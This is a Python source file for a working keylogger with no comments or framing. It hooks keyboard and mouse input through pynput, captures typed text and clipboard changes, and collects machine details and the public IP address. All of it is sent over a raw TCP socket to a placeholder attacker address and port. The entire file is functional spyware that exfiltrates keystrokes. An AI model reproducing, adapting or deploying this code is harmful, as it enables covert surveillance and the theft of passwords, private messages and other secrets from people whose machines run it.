from platform import version, system, machine
from pynput import keyboard, mouse
from pyperclip import paste
from requests import get
import socket

line = []
current_clipboard = ""
caps_lock_count = 0

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
server.connect(("[IP ADDRESS]", [PORT]))


def get_public_ip():

    response = get("https://api.ipify.org?format=json")
    data = response.json()
    return data["ip"]


def machine_info():

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    info = f"""Machine: {machine()}
                 OS: {system()}
                 Version: {version()}
               
                 IP address: {ip_address}
                 Public IP: {get_public_ip()}"""

    process_data(info)


def mouse_click(x, y, button, pressed):
    
    btn = button.name
    
    if btn == 'left' and pressed:
        process_data(''.join(line))
        line.clear()


def get_clipboard():

    global line
    global current_clipboard

    clipboard = paste()

    if clipboard != current_clipboard:

        current_clipboard = clipboard

        line.append(f" [clipboard] {clipboard} [clipboard] ")
        process_data(''.join(line))
        line.clear()
    else:
        pass


def send_data(key):
    
    global line
    global caps_lock_count

    try:
        if key is not None:

            get_clipboard()
            line.append(key.char)

    except AttributeError:        

        if key == keyboard.Key.enter:
            process_data(''.join(line))
            line.clear()
        
        elif key == keyboard.Key.space:
            line.append(' ')
    
        elif key == keyboard.Key.tab:
            line.append('   ')
    
        elif key == keyboard.Key.backspace:
            if len(line) > 0:
                line.pop()
    
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
            pass

        elif key == keyboard.Key.caps_lock:
    
            if caps_lock_count == 1:
                line.append(" [caps_lock OFF] ")
                caps_lock_count = 0
            else:
                line.append(" [caps_lock ON] ")
                caps_lock_count = 1
        else:
            pass


def process_data(text):

    server.send(text.encode())


def main():

    machine_info()

    mouse_listener = mouse.Listener(on_click=mouse_click)
    mouse_listener.start()

    keyboard_listener = keyboard.Listener(on_press=send_data)
    keyboard_listener.start()

    keyboard_listener.join()
    

if __name__ == "__main__":

    main()
    server.close()
